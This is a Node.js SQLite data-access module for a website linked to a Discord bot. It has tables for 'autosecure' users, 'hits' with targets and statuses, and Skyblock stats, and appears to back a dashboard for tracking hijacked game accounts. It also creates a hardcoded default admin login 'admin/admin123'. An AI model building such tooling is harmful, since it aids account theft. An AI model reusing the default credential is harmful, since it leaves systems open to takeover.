const sqlite3 = require("sqlite3").verbose();
const path = require("path");
const bcrypt = require("bcryptjs");

// Use the same database path as the Discord bot
const dbPath = path.join(process.cwd(), "../upload/notcool/db/database.db");

class Database {
  constructor() {
    this.db = new sqlite3.Database(dbPath, (err) => {
      if (err) {
        console.error("Error opening database:", err.message);
      } else {
        console.log("Connected to Discord bot's SQLite database");
        this.initializeWebsiteTables();
      }
    });
  }

  queryParams(command, params = [], method = "all") {
    return new Promise((resolve, reject) => {
      this.db[method](command, params, (error, result) => {
        if (error) {
          reject(error);
        } else {
          resolve(result);
        }
      });
    });
  }

  async initializeWebsiteTables() {
    // Only add new tables needed for the website, don't recreate existing bot tables
    const newTables = {
      // Admin users for website access
      website_admins: `
        CREATE TABLE IF NOT EXISTS website_admins(
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT UNIQUE NOT NULL,
          password_hash TEXT NOT NULL,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
          last_login DATETIME
        )`,
      
      // Hit tracking (extending the existing autosecure functionality)
      hits: `
        CREATE TABLE IF NOT EXISTS hits(
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id TEXT NOT NULL,
          target TEXT NOT NULL,
          hit_type TEXT NOT NULL,
          status TEXT DEFAULT 'pending',
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
          completed_at DATETIME,
          notes TEXT,
          FOREIGN KEY (user_id) REFERENCES autosecure(user_id)
        )`,
      
      // User sessions for website
      user_sessions: `
        CREATE TABLE IF NOT EXISTS user_sessions(
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id TEXT NOT NULL,
          session_token TEXT UNIQUE NOT NULL,
          expires_at DATETIME NOT NULL,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
          FOREIGN KEY (user_id) REFERENCES autosecure(user_id)
        )`,
      
      // Website-specific settings
      website_settings: `
        CREATE TABLE IF NOT EXISTS website_settings(
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          key TEXT UNIQUE NOT NULL,
          value TEXT NOT NULL,
          updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`
    };

    for (const [tableName, query] of Object.entries(newTables)) {
      try {
        await this.queryParams(query, [], "run");
        console.log(`Website table ${tableName} initialized`);
      } catch (err) {
        console.error(`Error creating table ${tableName}:`, err.message);
      }
    }

    // Create default admin user if none exists
    await this.createDefaultAdmin();
  }

  async createDefaultAdmin() {
    try {
      const existingAdmin = await this.queryParams(
        "SELECT * FROM website_admins LIMIT 1",
        [],
        "get"
      );

      if (!existingAdmin) {
        const defaultPassword = "admin123";
        const hashedPassword = await bcrypt.hash(defaultPassword, 10);
        
        await this.queryParams(
          "INSERT INTO website_admins (username, password_hash) VALUES (?, ?)",
          ["admin", hashedPassword],
          "run"
        );
        
        console.log("Default admin user created: admin/admin123");
      }
    } catch (err) {
      console.error("Error creating default admin:", err.message);
    }
  }

  // User management methods (using existing autosecure table)
  async getUserByDiscordId(discordId) {
    return await this.queryParams(
      "SELECT * FROM autosecure WHERE user_id = ?",
      [discordId],
      "get"
    );
  }

  async getAllUsers() {
    return await this.queryParams(
      "SELECT * FROM autosecure ORDER BY id DESC"
    );
  }

  async updateUserPremium(userId, isPremium) {
    return await this.queryParams(
      "UPDATE autosecure SET premium = ? WHERE user_id = ?",
      [isPremium ? "true" : "false", userId],
      "run"
    );
  }

  // Hit management methods
  async createHit(userId, target, hitType, notes = "") {
    return await this.queryParams(
      "INSERT INTO hits (user_id, target, hit_type, notes) VALUES (?, ?, ?, ?)",
      [userId, target, hitType, notes],
      "run"
    );
  }

  async getUserHits(userId) {
    return await this.queryParams(
      "SELECT * FROM hits WHERE user_id = ? ORDER BY created_at DESC",
      [userId]
    );
  }

  async getAllHits() {
    return await this.queryParams(
      `SELECT h.*, a.premium, a.domain 
       FROM hits h 
       LEFT JOIN autosecure a ON h.user_id = a.user_id 
       ORDER BY h.created_at DESC`
    );
  }

  async updateHitStatus(hitId, status, notes = "") {
    return await this.queryParams(
      "UPDATE hits SET status = ?, notes = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?",
      [status, notes, hitId],
      "run"
    );
  }

  async deleteHit(hitId) {
    return await this.queryParams(
      "DELETE FROM hits WHERE id = ?",
      [hitId],
      "run"
    );
  }

  // Admin methods
  async validateAdmin(username, password) {
    const admin = await this.queryParams(
      "SELECT * FROM website_admins WHERE username = ?",
      [username],
      "get"
    );

    if (admin && await bcrypt.compare(password, admin.password_hash)) {
      await this.queryParams(
        "UPDATE website_admins SET last_login = CURRENT_TIMESTAMP WHERE id = ?",
        [admin.id],
        "run"
      );
      return admin;
    }
    return null;
  }

  async createAdmin(username, password) {
    const hashedPassword = await bcrypt.hash(password, 10);
    return await this.queryParams(
      "INSERT INTO website_admins (username, password_hash) VALUES (?, ?)",
      [username, hashedPassword],
      "run"
    );
  }

  // Stats methods
  async getUserStats(userId) {
    const totalHits = await this.queryParams(
      "SELECT COUNT(*) as count FROM hits WHERE user_id = ?",
      [userId],
      "get"
    );

    const completedHits = await this.queryParams(
      "SELECT COUNT(*) as count FROM hits WHERE user_id = ? AND status = 'completed'",
      [userId],
      "get"
    );

    const pendingHits = await this.queryParams(
      "SELECT COUNT(*) as count FROM hits WHERE user_id = ? AND status = 'pending'",
      [userId],
      "get"
    );

    const failedHits = await this.queryParams(
      "SELECT COUNT(*) as count FROM hits WHERE user_id = ? AND status = 'failed'",
      [userId],
      "get"
    );

    return {
      total: totalHits.count,
      completed: completedHits.count,
      pending: pendingHits.count,
      failed: failedHits.count
    };
  }

  async getGlobalStats() {
    const totalUsers = await this.queryParams(
      "SELECT COUNT(*) as count FROM autosecure",
      [],
      "get"
    );

    const totalHits = await this.queryParams(
      "SELECT COUNT(*) as count FROM hits",
      [],
      "get"
    );

    const completedHits = await this.queryParams(
      "SELECT COUNT(*) as count FROM hits WHERE status = 'completed'",
      [],
      "get"
    );

    const premiumUsers = await this.queryParams(
      "SELECT COUNT(*) as count FROM autosecure WHERE premium = 'true'",
      [],
      "get"
    );

    const activeUsers = await this.queryParams(
      "SELECT COUNT(*) as count FROM autosecure WHERE autosecureEnabled = 1",
      [],
      "get"
    );

    return {
      totalUsers: totalUsers.count,
      totalHits: totalHits.count,
      completedHits: completedHits.count,
      premiumUsers: premiumUsers.count,
      activeUsers: activeUsers.count
    };
  }

  // Bot-specific data access methods
  async getUserProfiles(userId) {
    return await this.queryParams(
      "SELECT * FROM profiles WHERE user_id = ?",
      [userId]
    );
  }

  async getUserEmbeds(userId) {
    return await this.queryParams(
      "SELECT * FROM embeds WHERE user_id = ?",
      [userId]
    );
  }

  async getSkyblockStats(userId) {
    return await this.queryParams(
      "SELECT * FROM skyblock_stats WHERE id = ?",
      [userId],
      "get"
    );
  }

  close() {
    this.db.close((err) => {
      if (err) {
        console.error("Error closing database:", err.message);
      } else {
        console.log("Database connection closed");
      }
    });
  }
}

module.exports = new Database();

